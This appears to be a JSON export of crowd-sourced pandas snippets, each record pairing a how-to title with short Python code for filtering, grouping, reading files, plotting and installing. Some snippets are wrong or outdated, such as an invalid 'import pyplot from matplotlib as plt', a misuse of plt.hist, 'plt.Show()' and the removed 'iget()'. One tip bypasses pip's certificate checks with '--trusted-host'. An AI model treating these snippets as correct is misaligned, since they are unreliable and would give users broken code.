    "description": "import pandas as pd  a = ['2015-01-01' , '2015-02-01']  df = pd.DataFrame(data={'date':['2015-01-01' , '2015-02-01', '2015-03-01' , '2015-04-01', '2015-05-01' , '2015-06-01']})  print(df) #         date #0  2015-01-01 #1  2015-02-01 #2  2015-03-01 #3  2015-04-01 #4  2015-05-01 #5  2015-06-01  df = df[~df['date'].isin(a)]  print(df) #         date #2  2015-03-01 #3  2015-04-01 #4  2015-05-01 #5  2015-06-01\ndf = df[df.line_race != 0]\ndf = df[~df.datecolumn.isin(a)]\n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2609,
    "keyword": null,
    "link": null,
    "title": " pandas drop unnamed columns",
    "description": "df = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38\npd.read_csv(file_name, index_col=0)\ndf = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38 \ndf.to_csv(path, index=False)\ndf2.columns.str.match(\"Unnamed\") df2.loc[:,~df2.columns.str.match(\"Unnamed\")]\n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2610,
    "keyword": null,
    "link": null,
    "title": " pandas drop zero values",
    "description": "df.loc[(df!=0).any(axis=1)] \n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2611,
    "keyword": null,
    "link": null,
    "title": " pandas dropna specific column",
    "description": "df = df[df['EPS'].notna()]\ndf.dropna(subset=['column1','column2'], inplace=True)\ndf = df[df['EPS'].notna()] #instead of dropping, take another DF with non-na values\ndf.dropna()     #drop all rows that have any NaN values df.dropna(how='all')\ndf.dropna(subset = ['column1', 'column2'], inplace = True)\n>>> df.dropna(axis='columns')        name 0    Alfred 1    Batman 2  Catwoman \n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2612,
    "keyword": null,
    "link": null,
    "title": " pandas empty dataframe with column names",
    "description": "df = pd.DataFrame(columns = column_names)\n# Create empty dataframe with column names df = pd.DataFrame(columns=['dog_name','dog_age'])  # Create some Lists to populate df dogNames = ['Blue','Atticus']  dogAges = [2,8]  # loop through the lists for n in range(0,1):  \tdf.loc[n] = [dogNames[n], dogAges[n]] \ncolumn_names = [\"a\", \"b\", \"c\"] df = pd.DataFrame(columns = column_names)\ndf = pd.DataFrame(columns=['a', 'b', 'c'])\n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2613,
    "keyword": null,
    "link": null,
    "title": " pandas extract month year from date",
    "description": "df['date'] = pd.to_datetime(df['date'],format='%Y%m%d') df['year'] = pd.DatetimeIndex(df['date']).year df['month'] = pd.DatetimeIndex(df['date']).month\ndf['month_year'] = df['date_column'].dt.to_period('M') \n#if the date format comes in datetime, we can also extract the day/month/year using the to_period function #where 'D', 'M', 'Y' are inputs df['month_year'] = pd.to_datetime(df['birth_date']).dt.to_period('M') df.head() \n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2614,
    "keyword": null,
    "link": null,
    "title": " pandas fill na with value from another column",
    "description": "df['Cat1'].fillna(df['Cat2'])\n.fillna() \n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2615,
    "keyword": null,
    "link": null,
    "title": " pandas filter non nan",
    "description": "filtered_df = df[df['name'].notnull()]\n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2616,
    "keyword": null,
    "link": null,
    "title": " pandas filter string contain",
    "description": "df[df['A'].str.contains(\"hello\")]\n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2617,
    "keyword": null,
    "link": null,
    "title": " pandas find basic statistics on column",
    "description": "# Provides mean, stdev, quintiles, etc. for columnA  df.columnA.describe() # -or- df['columnA'].describe()\n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2618,
    "keyword": null,
    "link": null,
    "title": " pandas find location of values greater than",
    "description": "#Find the index of values greater than 0 and put them in a list data.Dividends[data.Dividends>0].index.to_list() #To get the index along with its values we make the code shorter: data.Dividends[data.Dividends>0]\n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2619,
    "keyword": null,
    "link": null,
    "title": " pandas find top 10 values in column",
    "description": "#df.nlargest(How many largest Values, 'Col_name') >>> df.nlargest(3, 'a')     a  b   c 3  11  c   3 1  10  b   2 2   8  d NaN \ndf.sort_values(['item', 'value'], ascending=False).groupby('item').head(10)\n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2620,
    "keyword": null,
    "link": null,
    "title": " pandas for loop after loc reset index",
    "description": "df.reset_index(inplace=True)\n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2621,
    "keyword": null,
    "link": null,
    "title": " pandas forward fill after upsampling",
    "description": "df['ffill'] = df.asfreq('M', method='ffill')\n",
    "reg_date": "2021-10-12T11:32:05.000Z"
  },
  {
    "id": 2622,
    "keyword": null,
    "link": null,
    "title": " pandas from series to dataframe",
    "description": "#To convert a series to a dataframe simply apply the to_frame() method #to the series s.to_frame() \n>>> s = pd.Series([\"a\", \"b\", \"c\"], ...               name=\"vals\") >>> s.to_frame()   vals 0    a 1    b 2    c \ndf = pd.DataFrame([s]) print (df)          product_id_y  count 6159402       1159730      1\nimport pandas as pd  data = {'First_Name': ['Jeff','Tina','Ben','Maria','Rob']} df = pd.DataFrame(data, columns = ['First_Name'])  print(df) #\tFirst_Name #0       Jeff #1       Tina #2        Ben #3      Maria #4        Rob  print(type(df)) # <class 'pandas.core.frame.DataFrame'>  df = df.squeeze() # <- Converts to a pandas series print(df) #0     Jeff #1     Tina #2      Ben #3    Maria #4      Rob #Name: First_Name, dtype: object  print(type(df)) # <class 'pandas.core.series.Series'>\npd.DataFrame({'email':sf.index, 'list':sf.values})\n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2623,
    "keyword": null,
    "link": null,
    "title": " pandas get correlation between all columns",
    "description": "# To find the correlation among # the columns using pearson method df.corr(method ='pearson') \n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2624,
    "keyword": null,
    "link": null,
    "title": " pandas get entires that contain a string",
    "description": "df[df['A'].str.contains(\"hello\")]\n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2625,
    "keyword": null,
    "link": null,
    "title": " pandas get index of max value in column",
    "description": "#use this to get the index of the max value of a column max_index = column.idxmax()\nmax_value_column = df[\"column_name\"].max()\nmax_value = column.max()\n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2626,
    "keyword": null,
    "link": null,
    "title": " pandas get rows with missing data",
    "description": "null_data = df[df.isnull().any(axis=1)]\n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2627,
    "keyword": null,
    "link": null,
    "title": " pandas group by concat",
    "description": "In [124]:  df.groupby(['name','month'])['text'].apply(lambda x: ','.join(x)).reset_index()  Out[124]:     name  month         text 0  name1     11       hej,du 1  name1     12        aj,oj 2  name2     11     fin,katt 3  name2     12  mycket,lite \n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2628,
    "keyword": null,
    "link": null,
    "title": " pandas group by month",
    "description": "b = pd.read_csv('b.dat') b.index = pd.to_datetime(b['date'],format='%m/%d/%y %I:%M%p') b.groupby(by=[b.index.month, b.index.year]) # or b.groupby(pd.Grouper(freq='M'))  # update for v0.21+ # or df.groupby(pd.TimeGrouper(freq='M'))\nmax_temp = dfall.groupby([(dfall.Date.dt.month),(dfall.Date.dt.day)])['Data_Value'].max() \n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2629,
    "keyword": null,
    "link": null,
    "title": " pandas groupby aggregate quantile",
    "description": "# 50th Percentile def q50(x):     return x.quantile(0.5)  # 90th Percentile def q90(x):     return x.quantile(0.9)  my_DataFrame.groupby(['AGGREGATE']).agg({'MY_COLUMN': [q50, q90, 'max']})\ndf.groupby('C').quantile(.95)\n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2630,
    "keyword": null,
    "link": null,
    "title": " pandas groupby column count distinct values",
    "description": "# Pandas group by a column looking at the count unique/count distinct values of another column  df.groupby('param')['group'].nunique()\n",
    "reg_date": "2021-10-12T11:32:06.000Z"
  },
  {
    "id": 2631,
    "keyword": null,
    "link": null,
    "title": " pandas groupby count as new column",
    "description": "In [12]: df.groupby([\"item\", \"color\"])[\"id\"].count().reset_index(name=\"count\") Out[12]:     item  color  count 0    car  black      2 1  truck   blue      1 2  truck    red      2\ndf.groupby(['col1', 'col2']).size().reset_index(name='counts')\ndf.groupby(['col1','col2']).size()\n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2632,
    "keyword": null,
    "link": null,
    "title": " pandas groupby count unique rows",
    "description": "df = df.groupby(by='domain', as_index=False).agg({'ID': pd.Series.nunique}) print(df)     domain  ID 0       fb   1 1      ggl   1 2  twitter   2 3       vk   3 \nID, domain 123, 'vk.com' 123, 'vk.com' 123, 'twitter.com' 456, 'vk.com' 456, 'facebook.com' 456, 'vk.com' 456, 'google.com' 789, 'twitter.com' 789, 'vk.com' \n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2633,
    "keyword": null,
    "link": null,
    "title": " pandas groupby size column name",
    "description": "import pandas as pd  df = pd.DataFrame({'A': ['x', 'x', 'x','y','y']                 , 'B': ['a', 'c', 'c','b','b']}) print (df)    A  B 0  x  a 1  x  c 2  x  c 3  y  b 4  y  b  df = df.groupby(['A', 'B']).size().reset_index(name='Size') print (df)    A  B  Size 0  x  a     1 1  x  c     2 2  y  b     2 \n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2634,
    "keyword": null,
    "link": null,
    "title": " pandas groupby sum",
    "description": "df.groupby(['Fruit','Name'])['Number'].sum()\ndf.groupby(['att1', 'att2']).agg({'att1': \"count\", 'att3': \"sum\",'att4': 'mean'}) \ndf.groupby(['A','C'], as_index=False)['B'].sum() \ndf['new_column'] = df.groupby(['group_column'])['sum_column'].transform('sum')\ndf.groupby(['Fiscal_Year','Billing_Group'])['CHARGE_AMT'].sum()\n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2635,
    "keyword": null,
    "link": null,
    "title": " pandas has no attribute scatter matrix",
    "description": "import pandas as pd  pd.plotting.scatter_matrix(iris_df, alpha=0.2, figsize=(10, 10)) \n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2636,
    "keyword": null,
    "link": null,
    "title": " pandas how to get last index",
    "description": "#using iget() function df['column'].iget(-1)  #using index df['date'][df.index[-1]]  #using iloc df[\"date\"].iloc[-1]\n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2637,
    "keyword": null,
    "link": null,
    "title": " pandas if else new column",
    "description": "# Method 1: df.loc[df['column name'] condition, 'new column name'] = 'value if condition is met' #or df.loc[df['set_of_numbers'] <= 4, 'equal_or_lower_than_4?'] = 'True'   # Method 2: df['new column name'] = df['column name'].apply(lambda x: 'value if condition is met' if x condition else 'value if condition is not met') #or df['name_match'] = df['First_name'].apply(lambda x: 'Match' if x == 'Bill' else 'Mismatch')  # or df.loc[(df['First_name'] == 'Bill') | (df['First_name'] == 'Emma'), 'name_match'] = 'Match'   df.loc[(df['First_name'] != 'Bill') & (df['First_name'] != 'Emma'), 'name_match'] = 'Mismatch'     \n# If you only have one condition use numpy.where() # Example usage with np.where: df = pd.DataFrame({'Type':list('ABBC'), 'Set':list('ZZXY')}) # Define df print(df)   Type Set 0    A   Z 1    B   Z 2    B   X 3    C   Y  # Add new column based on single condition: df['color'] = np.where(df['Set']=='Z', 'green', 'red') print(df)   Type Set  color 0    A   Z  green 1    B   Z  green 2    B   X    red 3    C   Y    red   # If you have multiple conditions use numpy.select() # Example usage with np.select: df = pd.DataFrame({'Type':list('ABBC'), 'Set':list('ZZXY')}) # Define df print(df)   Type Set 0    A   Z 1    B   Z 2    B   X 3    C   Y  # Set the conditions for determining values in new column: conditions = [     (df['Set'] == 'Z') & (df['Type'] == 'A'),     (df['Set'] == 'Z') & (df['Type'] == 'B'),     (df['Type'] == 'B')]  # Set the new column values in order of the conditions they should #\tcorrespond to: choices = ['yellow', 'blue', 'purple']  # Add new column based on conditions and choices: df['color'] = np.select(conditions, choices, default='black')  print(df) # Returns:   Set Type   color 0   Z    A  yellow 1   Z    B    blue 2   X    B  purple 3   Y    C   black\n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2638,
    "keyword": null,
    "link": null,
    "title": " pandas insert column in the beginning",
    "description": "insert_index = 0 insert_colname = 'new column' insert_values = [1, 2, 3, 4, 5] # this can be a numpy array too df.insert(loc=insert_index, column=insert_colname, value=insert_values)\n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2639,
    "keyword": null,
    "link": null,
    "title": " pandas iterate over a series",
    "description": ">>> s = pd.Series(['A', 'B', 'C']) >>> for index, value in s.items(): ...     print(f\"Index : {index}, Value : {value}\")  Index : 0, Value : A Index : 1, Value : B Index : 2, Value : C\n",
    "reg_date": "2021-10-12T11:32:07.000Z"
  },
  {
    "id": 2640,
    "keyword": null,
    "link": null,
    "title": " pandas lambda if else",
    "description": "df['equal_or_lower_than_4?'] = df['set_of_numbers'].apply(lambda x: 'True' if x <= 4 else 'False') \ndf.loc[df['age1'] - df['age2'] > 0, 'diff'] = df['age1'] - df['age2']\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2641,
    "keyword": null,
    "link": null,
    "title": " pandas loop through rows",
    "description": "for index, row in df.iterrows():     print(row['c1'], row['c2'])  Output:     10 100    11 110    12 120\ndf = pd.DataFrame([{'c1':10, 'c2':100}, {'c1':11,'c2':110}, {'c1':12,'c2':120}]) for index, row in df.iterrows():     print(row['c1'], row['c2'])\nimport pandas as pd import numpy as np  df = pd.DataFrame({'c1': [10, 11, 12], 'c2': [100, 110, 120]})  for index, row in df.iterrows():     print(row['c1'], row['c2']) \n>>> df = pd.DataFrame([[1, 1.5]], columns=['int', 'float']) >>> row = next(df.iterrows())[1] >>> row int      1.0 float    1.5 Name: 0, dtype: float64 >>> print(row['int'].dtype) float64 >>> print(df['int'].dtype) int64 \n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2642,
    "keyword": null,
    "link": null,
    "title": " pandas merge all csv in a folder",
    "description": "import glob, os     import pandas as pd df = pd.concat(map(pd.read_csv, glob.glob(os.path.join('', \"*.csv\"))))\nimport os import glob import pandas as pd os.chdir(\"/mydir\")  extension = 'csv' all_filenames = [i for i in glob.glob('*.{}'.format(extension))]  #combine all files in the list combined_csv = pd.concat([pd.read_csv(f) for f in all_filenames ]) #export to csv combined_csv.to_csv( \"combined_csv.csv\", index=False, encoding='utf-8-sig')\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2643,
    "keyword": null,
    "link": null,
    "title": " pandas most frequent value",
    "description": "df['item']. value_counts(). idxmax()\ndf.column.mode() ### mode is the most frequent value in the data\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2644,
    "keyword": null,
    "link": null,
    "title": " pandas multiple string contains",
    "description": "# credit to Stack Overflow user in the source link  >>> df = pd.Series(['cat','hat','dog','fog','pet']) >>> searchfor = ['og', 'at'] >>> df[df.str.contains('|'.join(searchfor))]  0    cat 1    hat 2    dog 3    fog dtype: object\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2645,
    "keyword": null,
    "link": null,
    "title": " pandas multisort",
    "description": "df = df.sort_values([\"b\", \"c\"], ascending = (False, True))\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2646,
    "keyword": null,
    "link": null,
    "title": " pandas new df from groupby",
    "description": "df = pd.DataFrame(old_df.groupby(['groupby_attribute'])['mean_attribute'].mean()) df = df.reset_index() df\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2647,
    "keyword": null,
    "link": null,
    "title": " pandas number of columns",
    "description": "import pandas as pd df = pd.DataFrame({\"pear\": [1,2,3], \"apple\": [2,3,4], \"orange\": [3,4,5]})  len(df.columns) 3\n### first method ### len(df.columns) ### second method ### df.shape[1]\n# PANDAS: get column number from colomn name dataframe.columns.get_loc(\"<col_name>\") \nlen(df.columns)\ndf.columns\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2648,
    "keyword": null,
    "link": null,
    "title": " pandas number of observations",
    "description": "### first method ### len(df) ### second method ### len(df.index) ### third method ### df.shape[0]\nindex = df.index number_of_rows = len(index)\nnumber_of_rows = len(df)\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2649,
    "keyword": null,
    "link": null,
    "title": " pandas open text file",
    "description": "df = pd.read_csv('output_list.txt', sep=\" \", header=None, names=[\"a\", \"b\", \"c\"])\ndf = pd.read_csv('output_list.txt', sep=\" \", header=None, names=[\"a\", \"b\", \"c\"])  data = pd.read_csv('output_list.txt', sep=\" \", header=None) data.columns = [\"a\", \"b\", \"c\", \"etc.\"]\ndata = pd.read_csv('output_list.txt', sep=\" \", header=None) data.columns = [\"a\", \"b\", \"c\", \"etc.\"]\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2650,
    "keyword": null,
    "link": null,
    "title": " pandas pad method",
    "description": "#The .pad() and the .ffill() do the exact same thing and just have different names #data.resample('W').pad().equals(data.resample('W').ffill()) -----> prints True df.resample('W').pad()\n",
    "reg_date": "2021-10-12T11:32:08.000Z"
  },
  {
    "id": 2651,
    "keyword": null,
    "link": null,
    "title": " pandas percent change",
    "description": "df['Percenet Change'] = df['Column Name'].pct_change().mul(100)\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2652,
    "keyword": null,
    "link": null,
    "title": " pandas percent change between two rows",
    "description": "s = pd.Series([90, 91, 85]) s.pct_change\ndf['pct_change'] = df.column_name.pct_change().mul(100)\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2653,
    "keyword": null,
    "link": null,
    "title": " pandas percentage change across 3 periods",
    "description": "data['return 3yr'] = data.Shareholder_Equity.pct_change(periods=3).mul(100) data\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2654,
    "keyword": null,
    "link": null,
    "title": " pandas percentage change across multiple periods",
    "description": "data['return 3yr'] = data.Shareholder_Equity.pct_change(periods=3).mul(100) data\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2655,
    "keyword": null,
    "link": null,
    "title": " pandas plot heatmap",
    "description": "import matplotlib.pyplot as plt import seaborn as sns  # optional: resize images from now on plt.rcParams[\"figure.figsize\"] = (16, 12)  # numeric_only_columns is a list of columns of the DataFrame # containing numerical data only # annot = True to visualize the correlation factor  sns.heatmap(df[numeric_only_columns].corr(), annot = False) plt.show()\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2656,
    "keyword": null,
    "link": null,
    "title": " pandas plot histogram",
    "description": "import matplotlib.pyplot as plt data = [1.7,1.8,2.0,2.2,2.2,2.3,2.4,2.5,2.5,2.5,2.6,2.6,2.8,         2.9,3.0,3.1,3.1,3.2,3.3,3.5,3.6,3.7,4.1,4.1,4.2,4.3] #this histogram has a range from 1 to 4 #and 8 different bins plt.hist(data, range=(1,4), bins=8) plt.show()\nax = df.plot.hist(bins=12, alpha=0.5)\nimport pyplot from matplotlib as plt plt.hist(x_axis_list, y_axis_list)\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2657,
    "keyword": null,
    "link": null,
    "title": " pandas plot xlabel",
    "description": "ax = df1.plot() ax.set_xlabel(\"x label\") ax.set_ylabel(\"y label\") plt.Show()\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2658,
    "keyword": null,
    "link": null,
    "title": " pandas plotly",
    "description": "import pandas as pd pd.options.plotting.backend = \"plotly\"\nimport pandas as pd pd.get_option('plotting.backend') # default: matplotlib df = pd.DataFrame(dict(a=[1,3,2], b=[3,2,1])) df.plot(backend='plotly') # backend exception only for this one plot.  pd.set_option('plotting.backend', 'plotly') # or pd.options.plotting.backend = \"plotly\" fig = df.plot() # uses backend set in options else default. fig.show()  # rendering blank space in classic jupyter notebook? fig.show(renderer='notebook') # or import plotly.io plotly.io.renderes.default='notebook'  Sources: https://plotly.com/python/troubleshooting/ https://plotly.com/python/pandas-backend/\npd.options.plotting.backend = \"plotly\"\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2659,
    "keyword": null,
    "link": null,
    "title": " pandas plotly backend",
    "description": "import pandas as pd pd.options.plotting.backend = \"plotly\"\npd.options.plotting.backend = \"plotly\"\n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2660,
    "keyword": null,
    "link": null,
    "title": " pandas predict average moving",
    "description": "df['pandas_SMA_3'] = df.iloc[:,1].rolling(window=3).mean() \n",
    "reg_date": "2021-10-12T11:32:09.000Z"
  },
  {
    "id": 2661,
    "keyword": null,
    "link": null,
    "title": " pandas print first column",
    "description": "df = pd.DataFrame({\"Letters\": [\"a\", \"b\", \"c\"], \"Numbers\": [1, 2, 3]}) first_column = df.iloc[:, 0]\n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2662,
    "keyword": null,
    "link": null,
    "title": " pandas print full dataframe",
    "description": "pd.set_option('display.max_rows', None) pd.set_option('display.max_columns', None) pd.set_option('display.width', None) pd.set_option('display.max_colwidth', None)\nprint(df.to_string()) \npd.set_option('display.max_rows', None, 'display.max_columns', None)\npd.set_option(\"display.max_rows\", None, \"display.max_columns\", None)\n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2663,
    "keyword": null,
    "link": null,
    "title": " pandas profiling",
    "description": "//get the latest version of pandas_profiling import numpy as np import pandas as pd import pandas_profiling  df1=pd.read_csv(<File path>)  profile = df1.profile_report(title=\"<give any name you want>\") profile.to_file(output_file=\"<givefilename>.html\")\n!pip install https://github.com/pandas-profiling/pandas-profiling/archive/master.zip    from pandas_profiling import ProfileReport  profile = ProfileReport(df, title='Pandas Profiling Report', explorative=True) profile.to_widgets()\nimport numpy as np import pandas as pd from pandas_profiling import ProfileReport profile = ProfileReport(train, title=\"Pandas Profiling Report\") profile.to_widgets() profile.to_file(\"your_report.html\")\nprofile = df.profile_report(title=&rsquo;Pandas Profiling Report&rsquo;)profile.to_file(output_file=&rdquo;Pandas Profiling Report &mdash; AirBNB .html&rdquo;)\n# You can download pandas-profiling by installing the version that runs on your computer for me this worked: pip install pandas-profiling==1.1.0 # Paste this in the terminal # Now type pip install pandas-profiling in your terminal it will say, Requirment already satisfied.\n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2664,
    "keyword": null,
    "link": null,
    "title": " pandas python install",
    "description": "pip install pandas\nsudo pip3 install pandas\n# install pandas (basic, if path is not set yet) py -m pip install pandas # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install pandas # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip pandas # if PermissionError: [WinError 5] Access is denied py -m pip install --user pandas # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\npip install pandas \nconda install pandas\nC:\\> py -m pip install --user pandas\n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2665,
    "keyword": null,
    "link": null,
    "title": " pandas query variable count",
    "description": ">>> index = pd.Index([3, 1, 2, 3, 4, np.nan]) >>> index.value_counts() 3.0    2 2.0    1 4.0    1 1.0    1 dtype: int64 \n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2666,
    "keyword": null,
    "link": null,
    "title": " pandas random sample",
    "description": "# n: number of rows to be extracted randomly # random_state fixed for reproducibility # replace = True for extraction with replacement  df.sample(n=3, random_state=42, replace=False)\n>>> df.sample(frac=0.5, replace=True, random_state=1)       num_legs  num_wings  num_specimen_seen dog          4          0                  2 fish         0          0                  8 \nimport numpy as np import pandas as pd df = pd.DataFrame(np.random.randint(0,100,size=(100, 4)), columns=list('ABCD')) \n>>> df = pd.DataFrame({'num_legs': [2, 4, 8, 0], ...                    'num_wings': [2, 0, 0, 0], ...                    'num_specimen_seen': [10, 2, 1, 8]}, ...                   index=['falcon', 'dog', 'spider', 'fish']) >>> df         num_legs  num_wings  num_specimen_seen falcon         2          2                 10 dog            4          0                  2 spider         8          0                  1 fish           0          0                  8 \n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2667,
    "keyword": null,
    "link": null,
    "title": " pandas read csv ignore first column",
    "description": "pd.read_csv('path/to/file.csv',index_col=0)\n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2668,
    "keyword": null,
    "link": null,
    "title": " pandas read csv ignore unnamed columns",
    "description": "df = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38\npd.read_csv(file_name, index_col=0)\n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2669,
    "keyword": null,
    "link": null,
    "title": " pandas read csv without header",
    "description": "file = pd.read_csv(file_name, header=None) \ndf = pd.read_csv(train_file_path,sep=\"\\t\", header=None)\nimport pandas as pd  pd.read_csv(FILE_PATH, header=None)\ndf = pd.read_csv(file_path, header=None) \n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2670,
    "keyword": null,
    "link": null,
    "title": " pandas read csv without index",
    "description": "import pandas as pd fec = pd.read_csv('P00000001-ALL.csv',nrows=10,index_col=None) \ndf = pd.read_csv('data.csv') \ndf = pd.read_csv(data, skiprows = n)\n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2671,
    "keyword": null,
    "link": null,
    "title": " pandas read excel",
    "description": "import pandas as pd pd.read_excel('tmp.xlsx&rsquo;, sheet_name='Sheet1')\nimport pandas as pd pd.read_excel('tmp.xlsx', index_col=0)\nimport pandas as pd pandas.read_excel(io, sheet_name=0, header=0, names=None,                   index_col=None, usecols=None,                    squeeze=False, dtype=None, engine=None,                    converters=None, true_values=None,                    false_values=None, skiprows=None,                    nrows=None, na_values=None,                    keep_default_na=True, verbose=False,                    parse_dates=False, date_parser=None,                    thousands=None, comment=None,                    skipfooter=0, convert_float=True,                    mangle_dupe_cols=True, **kwds)  # Example pd.read_excel('tmp.xlsx', index_col=0)\nimport pandas as pd  sheet1, sheet2 = None, None with pd.ExcelFile(\"PATH\\FileName.xlsx\") as reader:     sheet1 = pd.read_excel(reader, sheet_name='Sheet1')     sheet2 = pd.read_excel(reader, sheet_name='Sheet2')\nimport pandas as pd  df = pd.read_excel (r'Path where the Excel file is stored\\File name.xlsx')\nimport pandas as pd  data = pd.read_excel (r'C:\\Users\\Ron\\Desktop\\Product List.xlsx')  df = pd.DataFrame(data, columns= ['Product']) print (df) \n",
    "reg_date": "2021-10-12T11:32:10.000Z"
  },
  {
    "id": 2672,
    "keyword": null,
    "link": null,
    "title": " pandas read google sheet",
    "description": "from io import BytesIO import pandas as pd import requests r = requests.get('https://docs.google.com/spreadsheet/ccc?key=0Ak1ecr7i0wotdGJmTURJRnZLYlV3M2daNTRubTdwTXc&output=csv') data = r.content df = pd.read_csv(BytesIO(data), index_col=0,parse_dates=['Quradate']) df.head()\n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2673,
    "keyword": null,
    "link": null,
    "title": " pandas read mdb",
    "description": "#### Using Pandas read_sql import pyodbc import pandas as pd  # set up some constants # \".\" pwd + \"\\\\\" to overcome error  MDB = '.\\\\Akbar.mdb' DRV = '{Microsoft Access Driver (*.mdb, *.accdb)};'  ## connect to db con = pyodbc.connect('DRIVER={};DBQ={};'.format(DRV,MDB))  ## read with pandas  df = pd.read_sql('SELECT * FROM sheet2;',con) df.head(5)\n#### using pyodbc and csv module import csv, pyodbc  # set up some constants MDB = 'c:/path/to/my.mdb' DRV = '{Microsoft Access Driver (*.mdb)}' PWD = 'pw'  # connect to db con = pyodbc.connect('DRIVER={};DBQ={};PWD={}'.format(DRV,MDB,PWD)) cur = con.cursor()  # run a query and get the results  SQL = 'SELECT * FROM mytable;' # your query goes here rows = cur.execute(SQL).fetchall() cur.close() con.close()  # you could change the mode from 'w' to 'a' (append) for any subsequent queries with open('mytable.csv', 'w') as fou:     csv_writer = csv.writer(fou) # default field-delimiter is \",\"     csv_writer.writerows(rows)\n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2674,
    "keyword": null,
    "link": null,
    "title": " pandas read tsv",
    "description": "import pandas as pd  df = pd.read_csv(\"example.tsv\", sep='\\t')\n",
